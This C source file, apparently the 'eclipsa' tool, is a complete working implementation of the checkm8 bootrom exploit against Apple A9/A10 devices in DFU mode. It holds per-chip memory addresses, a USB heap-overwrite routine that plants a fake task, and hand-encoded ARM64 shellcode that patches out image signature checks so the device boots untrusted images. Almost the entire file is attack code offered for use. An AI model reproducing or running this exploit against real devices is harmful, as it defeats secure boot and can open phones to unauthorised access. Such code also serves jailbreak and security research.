/* Copyright 2021 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOCFPlugIn.h>
#include <IOKit/usb/IOUSBLib.h>

#define MAGIC (0xB4)
#define DFU_DNLOAD (1)
#define DFU_STATUS_OK (0)
#define TASK_NAME_MAX (15)
#define DFU_GET_STATUS (3)
#define DFU_CLR_STATUS (4)
#define DFU_ARCH_SZ (0x310)
#define DFU_MODE_PID (0x1227)
#define DFU_STATE_MANIFEST (7)
#define TASK_STACK_MIN (0x4000)
#define EP0_MAX_PACKET_SZ (0x40)
#define DFU_HEAP_BLOCK_SZ (0x40)
#define DFU_FILE_SUFFIX_LEN (16)
#define TASK_MAGIC_1 (0x74736B32)
#define DFU_STATE_MANIFEST_SYNC (6)
#define TASK_STACK_MAGIC (0x7374616B)
#define DFU_STATE_MANIFEST_WAIT_RESET (8)

typedef struct {
	UInt64 prev, next;
} dfu_list_node_t;

typedef struct {
	UInt32 sz;
	kern_return_t ret;
} transfer_t;

typedef struct {
	UInt32 magic_0, pad_0;
	dfu_list_node_t task_list, queue_list;
	enum {
		TASK_INITIAL,
		TASK_READY,
		TASK_RUNNING,
		TASK_BLOCKED,
		TASK_SLEEPING,
		TASK_FINISHED
	} state;
	UInt32 irq_dis_cnt;
	struct {
		UInt64 x[29], fp, lr, sp;
		UInt32 shc[(DFU_ARCH_SZ - 32 * sizeof(UInt64)) / sizeof(UInt32)];
	} arch;
	struct {
		dfu_list_node_t list;
		UInt64 sched_ticks, delay, cb, arg;
	} callout;
	dfu_list_node_t ret_waiters_list;
	UInt32 ret, pad_1;
	UInt64 routine, arg, stack_base, stack_len;
	char name[TASK_NAME_MAX + 1];
	UInt32 id, magic_1;
} dfu_task_t;

typedef struct {
	dfu_task_t synopsys_task;
	struct {
		UInt64 this_free : 1, prev_free : 1, prev_sz : 62, this_sz;
		UInt8 pad[DFU_HEAP_BLOCK_SZ - 2 * sizeof(UInt64)];
	} heap_block;
	dfu_task_t fake_task;
	UInt8 extra[EP0_MAX_PACKET_SZ];
} dfu_overwrite_t;

typedef struct {
	enum {
		STAGE_RESET,
		STAGE_SETUP,
		STAGE_PATCH,
		STAGE_ABORT,
		STAGE_PWNED
	} stage;
	UInt16 vid, pid;
	UInt32 patch_val[8];
	IOUSBDeviceInterface650 **device;
	CFRunLoopSourceRef async_event_source;
	UInt64 patch_addr[5], io_buffer_addr, arch_task_tramp_addr, vrom_page_table_addr, synopsys_routine_addr;
} handle_t;

static UInt16 cpid;

static void
cf_dictionary_set_int16(CFMutableDictionaryRef dict, const void *key, UInt16 val) {
	CFNumberRef cf_val = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &val);

	if(cf_val != NULL) {
		CFDictionarySetValue(dict, key, cf_val);
		CFRelease(cf_val);
	}
}

static kern_return_t
check_usb_device_serv(handle_t *handle, io_service_t serv, bool *pwned) {
	CFStringRef usb_serial_num = IORegistryEntryCreateCFProperty(serv, CFSTR(kUSBSerialNumberString), kCFAllocatorDefault, kNilOptions);
	kern_return_t ret = KERN_FAILURE;
	bool s8003;

	if(usb_serial_num != NULL) {
		if(CFGetTypeID(usb_serial_num) == CFStringGetTypeID()) {
			if(cpid == 0) {
				if((s8003 = CFStringFind(usb_serial_num, CFSTR(" SRTG:[iBoot-2234.0.0.2.22]"), 0).location != kCFNotFound) || CFStringFind(usb_serial_num, CFSTR(" SRTG:[iBoot-2234.0.0.3.3]"), 0).location != kCFNotFound) {
					handle->patch_addr[0] = 0x100007924;
					handle->patch_addr[1] = 0x10000792C;
					handle->patch_addr[2] = 0x100007958;
					handle->patch_addr[3] = 0x100007C9C;
					if(s8003) {
						cpid = 0x8003;
						handle->patch_addr[4] = 0x1800879BA;
					} else {
						cpid = 0x8000;
						handle->patch_addr[4] = 0x1800879B9;
					}
					handle->io_buffer_addr = 0x18010D500;
					handle->arch_task_tramp_addr = 0x10000D998;
					handle->vrom_page_table_addr = 0x1800C8400;
					handle->synopsys_routine_addr = 0x100006718;
				} else if(CFStringFind(usb_serial_num, CFSTR(" SRTG:[iBoot-1991.0.0.2.16]"), 0).location != kCFNotFound) {
					cpid = 0x7001;
					handle->patch_addr[0] = 0x10000A714;
					handle->patch_addr[1] = 0x10000A720;
					handle->patch_addr[2] = 0x10000A744;
					handle->patch_addr[3] = 0x10000AA08;
					handle->patch_addr[4] = 0x180088EAA;
					handle->io_buffer_addr = 0x18010D500;
					handle->arch_task_tramp_addr = 0x100010988;
					handle->synopsys_routine_addr = 0x1000064FC;
				} else if(CFStringFind(usb_serial_num, CFSTR(" SRTG:[iBoot-1992.0.0.1.19]"), 0).location != kCFNotFound) {
					cpid = 0x7000;
					handle->patch_addr[0] = 0x1000078B4;
					handle->patch_addr[1] = 0x1000078C0;
					handle->patch_addr[2] = 0x1000078E4;
					handle->patch_addr[3] = 0x100007BAC;
					handle->patch_addr[4] = 0x18008892A;
					handle->io_buffer_addr = 0x18010D300;
					handle->arch_task_tramp_addr = 0x10000D988;
					handle->synopsys_routine_addr = 0x100005530;
				}
				if(cpid != 0) {
					ret = KERN_SUCCESS;
					strcpy((char *)&handle->patch_val[4], " PWND:[eclipsa]");
					handle->patch_val[3] = handle->patch_val[2] = handle->patch_val[1] = handle->patch_val[0] = 0xD503201F; /* nop */
				}
			} else {
				ret = KERN_SUCCESS;
			}
			if(ret == KERN_SUCCESS) {
				*pwned = CFStringFind(usb_serial_num, CFSTR(" PWND:[eclipsa]"), 0).location != kCFNotFound;
			}
		}
		CFRelease(usb_serial_num);
	}
	return ret;
}

static kern_return_t
query_usb_interface(io_service_t serv, CFUUIDRef plugin_type, CFUUIDRef interface_type, LPVOID *interface) {
	IOCFPlugInInterface **plugin_interface;
	kern_return_t ret = KERN_FAILURE;
	SInt32 score;

	if(IOCreatePlugInInterfaceForService(serv, plugin_type, kIOCFPlugInInterfaceID, &plugin_interface, &score) == KERN_SUCCESS) {
		ret = (*plugin_interface)->QueryInterface(plugin_interface, CFUUIDGetUUIDBytes(interface_type), interface);
		IODestroyPlugInInterface(plugin_interface);
	}
	IOObjectRelease(serv);
	return ret;
}

static void
close_usb_device(const handle_t *handle) {
	CFRunLoopRemoveSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
	CFRelease(handle->async_event_source);
	(*handle->device)->USBDeviceClose(handle->device);
	(*handle->device)->Release(handle->device);
}

static kern_return_t
open_usb_device(io_service_t serv, handle_t *handle) {
	if(query_usb_interface(serv, kIOUSBDeviceUserClientTypeID, kIOUSBDeviceInterfaceID650, (LPVOID *)&handle->device) == KERN_SUCCESS) {
		if((*handle->device)->USBDeviceOpenSeize(handle->device) == KERN_SUCCESS) {
			if((*handle->device)->SetConfiguration(handle->device, 1) == KERN_SUCCESS && (*handle->device)->CreateDeviceAsyncEventSource(handle->device, &handle->async_event_source) == KERN_SUCCESS) {
				CFRunLoopAddSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
				return KERN_SUCCESS;
			}
			(*handle->device)->USBDeviceClose(handle->device);
		}
		(*handle->device)->Release(handle->device);
	}
	return KERN_FAILURE;
}

static kern_return_t
send_usb_device_request(const handle_t *handle, UInt8 bm_request_type, UInt8 b_request, UInt16 w_value, UInt16 w_index, void *p_data, UInt16 w_length) {
	IOUSBDevRequest req;

	req.wLenDone = 0;
	req.pData = p_data;
	req.bRequest = b_request;
	req.bmRequestType = bm_request_type;
	req.wValue = OSSwapLittleToHostInt16(w_value);
	req.wIndex = OSSwapLittleToHostInt16(w_index);
	req.wLength = OSSwapLittleToHostInt16(w_length);
	return (*handle->device)->DeviceRequest(handle->device, &req);
}

static void
usb_async_cb(void *refcon, kern_return_t ret, void *arg_0) {
	transfer_t *transfer = refcon;

	if(transfer != NULL) {
		transfer->ret = ret;
		memcpy(&transfer->sz, &arg_0, sizeof(transfer->sz));
		printf("transfer_ret: 0x%" PRIX32 ", transfer_sz: 0x%" PRIX32 "\n", transfer->ret, transfer->sz);
		CFRunLoopStop(CFRunLoopGetCurrent());
	}
}

static kern_return_t
send_usb_device_request_async(const handle_t *handle, UInt8 bm_request_type, UInt8 b_request, UInt16 w_value, UInt16 w_index, void *p_data, UInt16 w_length, transfer_t *transfer) {
	IOUSBDevRequest req;

	req.wLenDone = 0;
	req.pData = p_data;
	req.bRequest = b_request;
	req.bmRequestType = bm_request_type;
	req.wValue = OSSwapLittleToHostInt16(w_value);
	req.wIndex = OSSwapLittleToHostInt16(w_index);
	req.wLength = OSSwapLittleToHostInt16(w_length);
	return (*handle->device)->DeviceRequestAsync(handle->device, &req, usb_async_cb, transfer);
}

static kern_return_t
dfu_check_status(const handle_t *handle, UInt8 status, UInt8 state) {
	struct {
		UInt8 status, poll_timeout[3], state, str_idx;
	} dfu_status;

	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBIn, kUSBClass, kUSBInterface), DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status)) == KERN_SUCCESS && dfu_status.status == status && dfu_status.state == state) {
		return KERN_SUCCESS;
	}
	return KERN_FAILURE;
}

static kern_return_t
dfu_set_state_wait_reset(const handle_t *handle) {
	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, NULL, 0) == KERN_SUCCESS && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC) == KERN_SUCCESS && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST) == KERN_SUCCESS) {
		return dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
	}
	return KERN_FAILURE;
}

static kern_return_t
checkm8_stage_reset(const handle_t *handle) {
	UInt8 data[EP0_MAX_PACKET_SZ];

	memset(data, MAGIC, sizeof(data));
	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, data, DFU_FILE_SUFFIX_LEN) == KERN_SUCCESS && dfu_set_state_wait_reset(handle) == KERN_SUCCESS && send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, data, sizeof(data)) == KERN_SUCCESS) {
		return KERN_SUCCESS;
	}
	send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
	return KERN_FAILURE;
}

static kern_return_t
checkm8_stage_setup(const handle_t *handle) {
	dfu_overwrite_t overwrite;
	struct timespec req;
	transfer_t transfer;

	req.tv_sec = 0;
	req.tv_nsec = 64;
	memset(&overwrite, MAGIC, sizeof(overwrite));
	do {
		if(send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, &overwrite, sizeof(overwrite), &transfer) != KERN_SUCCESS || nanosleep(&req, NULL) != 0 || (*handle->device)->USBDeviceAbortPipeZero(handle->device) != KERN_SUCCESS) {
			break;
		}
		CFRunLoopRun();
		if(transfer.ret == kIOReturnAborted && transfer.sz <= sizeof(overwrite.extra)) {
			if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, &overwrite, (UInt16)(offsetof(dfu_overwrite_t, synopsys_task.callout) - transfer.sz)) != kIOUSBPipeStalled) {
				break;
			}
			return send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
		}
	} while(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, &overwrite.extra, sizeof(overwrite.extra)) == KERN_SUCCESS);
	return KERN_FAILURE;
}

static kern_return_t
checkm8_stage_patch(const handle_t *handle) {
	dfu_overwrite_t overwrite;
	UInt32 *shc;

	memset(&overwrite, '\0', sizeof(overwrite));
	overwrite.synopsys_task.id = 5;
	strcpy(overwrite.synopsys_task.name, "usb");
	overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
	overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
	overwrite.synopsys_task.routine = handle->synopsys_routine_addr;
	overwrite.synopsys_task.stack_base = handle->io_buffer_addr + offsetof(dfu_overwrite_t, fake_task);
	overwrite.synopsys_task.ret_waiters_list.prev = overwrite.synopsys_task.ret_waiters_list.next = overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);

	overwrite.heap_block.prev_sz = sizeof(overwrite.synopsys_task) / sizeof(overwrite.heap_block) + 1;
	overwrite.heap_block.this_sz = overwrite.synopsys_task.stack_len / sizeof(overwrite.heap_block) + 2;

	overwrite.fake_task.id = 6;
	overwrite.fake_task.irq_dis_cnt = 1;
	overwrite.fake_task.state = TASK_RUNNING;
	overwrite.fake_task.magic_1 = TASK_MAGIC_1;
	strcpy(overwrite.fake_task.name, "eclipsa");
	shc = overwrite.fake_task.arch.shc;
	if(cpid == 0x8000 || cpid == 0x8003) {
		overwrite.fake_task.arg = handle->vrom_page_table_addr;
		*shc++ = 0xD50343DF; /* msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF) */
		*shc++ = 0xD5033FDF; /* isb */
		*shc++ = 0xF940000A; /* ldr x10, [x0] */
		*shc++ = 0xB24B054A; /* orr x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
		*shc++ = 0xF900000A; /* str x10, [x0] */
		*shc++ = 0xD5033F9F; /* dsb sy */
		*shc++ = 0xD50E871F; /* tlbi alle3 */
		*shc++ = 0xD5033F9F; /* dsb sy */
		*shc++ = 0xD5033FDF; /* isb */
		*shc++ = 0x100002C8; /* adr x8, #0x58 */
	} else {
		*shc++ = 0x100001C8; /* adr x8, #0x38 */
	}
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB9000269; /* str w9, [x19] */
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB9000289; /* str w9, [x20] */
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB90002A9; /* str w9, [x21] */
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB90002C9; /* str w9, [x22] */
	*shc++ = 0xF8408509; /* ldr x9, [x8], #8 */
	*shc++ = 0xF80086E9; /* str x9, [x23], #8 */
	*shc++ = 0xF9400109; /* ldr x9, [x8] */
	*shc++ = 0xF90002E9; /* str x9, [x23] */
	if(cpid == 0x8000 || cpid == 0x8003) {
		*shc++ = 0x9249F54A; /* bic x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
		*shc++ = 0xF900000A; /* str x10, [x0] */
		*shc++ = 0xD5033F9F; /* dsb sy */
		*shc++ = 0xD50E871F; /* tlbi alle3 */
		*shc++ = 0xD5033F9F; /* dsb sy */
		*shc++ = 0xD5033FDF; /* isb */
		*shc++ = 0xD50343FF; /* msr DAIFClr, #(DAIFSC_IRQF | DAIFSC_FIQF) */
		*shc++ = 0xD5033FDF; /* isb */
	}
	*shc++ = 0xD65F03C0; /* ret */
	overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
	memcpy(shc, handle->patch_val, sizeof(handle->patch_val));
	overwrite.fake_task.arch.lr = handle->arch_task_tramp_addr;
	overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
	overwrite.fake_task.stack_base = overwrite.synopsys_task.stack_base;
	memcpy(&overwrite.fake_task.arch.x[19], handle->patch_addr, sizeof(handle->patch_addr));
	overwrite.fake_task.arch.sp = overwrite.fake_task.stack_base + overwrite.fake_task.stack_len;
	overwrite.fake_task.routine = overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
	overwrite.fake_task.queue_list.prev = overwrite.fake_task.queue_list.next = handle->io_buffer_addr + offsetof(dfu_task_t, ret_waiters_list);
	overwrite.fake_task.ret_waiters_list.prev = overwrite.fake_task.ret_waiters_list.next = overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, &overwrite.synopsys_task.callout, sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout)) == kIOUSBPipeStalled) {
		return send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
	}
	return KERN_FAILURE;
}

static void
attached_usb_handle(void *refcon, io_iterator_t iter) {
	handle_t *handle = refcon;
	bool pwned = false;
	kern_return_t ret;
	io_service_t serv;

	while((serv = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
		if(check_usb_device_serv(handle, serv, &pwned) == KERN_SUCCESS && !pwned) {
			puts("Found the USB device.");
			if(open_usb_device(serv, handle) == KERN_SUCCESS) {
				if(handle->stage == STAGE_RESET) {
					ret = checkm8_stage_reset(handle);
					printf("Stage: RESET");
					handle->stage = STAGE_SETUP;
				} else if(handle->stage == STAGE_SETUP) {
					ret = checkm8_stage_setup(handle);
					printf("Stage: SETUP");
					handle->stage = STAGE_PATCH;
				} else if(handle->stage == STAGE_PATCH) {
					ret = checkm8_stage_patch(handle);
					printf("Stage: PATCH");
					handle->stage = STAGE_ABORT;
				} else {
					ret = send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
					printf("Stage: ABORT");
				}
				printf(", ret: 0x%" PRIX32 "\n", ret);
				usleep(100);
				if(((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) && handle->stage != STAGE_ABORT) {
					handle->stage = STAGE_RESET;
				}
				close_usb_device(handle);
			}
		} else {
			IOObjectRelease(serv);
			if(pwned) {
				handle->stage = STAGE_PWNED;
				CFRunLoopStop(CFRunLoopGetCurrent());
				puts("Now you can boot untrusted images.");
				break;
			}
		}
	}
}

static void
eclipsa(handle_t *handle) {
	IONotificationPortRef notify_port = IONotificationPortCreate(kIOMasterPortDefault);
	CFMutableDictionaryRef matching_dict;
	CFRunLoopSourceRef run_loop_source;
	io_iterator_t attach_iter;

	if(notify_port != NULL) {
		if((run_loop_source = IONotificationPortGetRunLoopSource(notify_port)) != NULL) {
			CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopDefaultMode);
			if((matching_dict = IOServiceMatching(kIOUSBDeviceClassName)) != NULL) {
				cf_dictionary_set_int16(matching_dict, CFSTR(kUSBVendorID), handle->vid);
				cf_dictionary_set_int16(matching_dict, CFSTR(kUSBProductID), handle->pid);
				if(IOServiceAddMatchingNotification(notify_port, kIOFirstMatchNotification, matching_dict, attached_usb_handle, handle, &attach_iter) == KERN_SUCCESS) {
					printf("Waiting for the USB device with VID: 0x%" PRIX16 ", PID: 0x%" PRIX16 "\n", handle->vid, handle->pid);
					attached_usb_handle(handle, attach_iter);
					if(handle->stage != STAGE_PWNED) {
						CFRunLoopRun();
					}
					IOObjectRelease(attach_iter);
				}
			}
			CFRunLoopRemoveSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopDefaultMode);
		}
		IONotificationPortDestroy(notify_port);
	}
}

int
main(void) {
	handle_t handle;

	handle.pid = DFU_MODE_PID;
	handle.stage = STAGE_RESET;
	handle.vid = kAppleVendorID;
	eclipsa(&handle);
	return handle.stage == STAGE_PWNED ? 0 : EXIT_FAILURE;
}
